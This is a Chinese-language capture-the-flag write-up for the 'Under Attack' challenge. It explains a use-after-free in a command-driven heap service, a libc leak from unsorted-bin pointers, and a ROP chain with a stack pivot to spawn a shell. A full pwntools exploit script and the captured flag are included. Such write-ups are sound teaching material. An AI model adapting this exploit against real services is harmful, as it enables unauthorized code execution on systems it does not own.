# Under Attack

## 题目简述

`ladybug_app` 提供一组文本命令，用于申请、释放、读取和写入“agent”堆块，并允许以用户给定地址启动接管流程。目标是利用释放后仍可访问的 agent 泄露 libc，再把 ROP 链写入已知堆地址并触发栈迁移。

## 解题过程

随题 ELF 是 64 位、无 PIE、启用 NX、Partial RELRO 且已去符号；攻击不依赖主程序代码地址随机化。命令接口中的关键操作为：

- `unleash_swarm <index> <size>`：申请堆块并返回地址；
- `retreat_agent <index>`：释放堆块；
- `gather_intel <index>`：读取对应地址的内容；
- `corrupt_systems <index> <hex>`：向堆块写入字节；
- `initiate_city_takeover <address>`：把执行栈切换到给定地址并继续执行。

释放 agent 后，程序没有清除保存的指针，因此 `gather_intel` 和 `corrupt_systems` 仍可访问已释放区域，形成 UAF。

先申请大小 1072 的 agent 0。对应堆块大于 tcache 管理范围，释放后会进入 unsorted bin，其用户区开头被 glibc 写入指向 `main_arena` 的 `fd`、`bk` 指针。紧接着申请一个 32 字节的 agent 1，作用是隔开大块与 top chunk，避免 agent 0 释放时直接向 top chunk 合并。

```text
unleash_swarm 0 1072
unleash_swarm 1 32
retreat_agent 0
gather_intel 0
```

读取 agent 0 的前 8 字节即可得到 unsorted-bin 指针。对于题目附带的 `libc.so.6`，该指针相对 libc 基址的偏移为 `0x1d2cc0`，因此 $\text{libc\_base}=\text{leak}-0x1d2cc0$。

随后申请 200 字节的 agent 2。服务会直接返回该堆块地址，所以可以把字符串 `/bin/sh` 与 ROP 链一起写入，并把接管地址设置为 `heap + 8`。前 8 字节存放字符串，之后依次是用于栈对齐的 `ret`、`pop rdi; ret`、字符串地址、`system` 和 `exit`。

精简后的完整利用脚本如下：

```python
import sys
from pwn import ELF, ROP, context, p64, remote, u64

context.arch = "amd64"
PROMPT = b"Noopsy Land is ours! Your command, Overlord?: "

io = remote(sys.argv[1], int(sys.argv[2]))
libc = ELF("./libc.so.6", checksec=False)


def allocate(index, size):
    io.sendlineafter(
        PROMPT,
        f"unleash_swarm {index} {size}".encode(),
    )
    line = io.recvline_startswith(b"AGENT_DEPLOYED:")
    return int(line.split(b": ")[1], 16)


def free(index):
    io.sendlineafter(
        PROMPT,
        f"retreat_agent {index}".encode(),
    )
    io.recvline_startswith(b"RECALL_OK:")


def read_agent(index):
    io.sendlineafter(
        PROMPT,
        f"gather_intel {index}".encode(),
    )
    line = io.recvline_startswith(b"INTEL_DATA:")
    return bytes.fromhex(line.split(b": ", 1)[1].decode())


def write_agent(index, data):
    command = (
        f"corrupt_systems {index} {data.hex()}"
    )
    io.sendlineafter(PROMPT, command.encode())
    io.recvline_startswith(b"INJECT_OK:")


allocate(0, 1072)
allocate(1, 32)
free(0)

arena_pointer = u64(read_agent(0)[:8])
libc.address = arena_pointer - 0x1D2CC0

heap = allocate(2, 200)
rop = ROP(libc)
ret = rop.find_gadget(["ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address

payload = b"/bin/sh\x00"
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(heap)
payload += p64(libc.sym.system)
payload += p64(libc.sym.exit)
write_agent(2, payload)

io.sendlineafter(
    PROMPT,
    f"initiate_city_takeover {heap + 8:#x}".encode(),
)
io.interactive()
```

取得 shell 后读取 flag：

```text
N0PS{its_N0pSt0pia's_Pleasure_that_L4dy_bug__is_w3aaker!!!__}
```

## 方法总结

利用链由三部分组成：UAF 读取 unsorted-bin 元数据泄露 libc，服务回显的堆地址提供稳定 ROP 存储位置，接管命令完成栈迁移。大块后追加小块是泄露成功的关键，否则大块可能与 top chunk 合并而不留下预期 `main_arena` 指针。泄露偏移与 libc 版本绑定，必须使用题目附带的 `libc.so.6` 计算符号和 gadget。
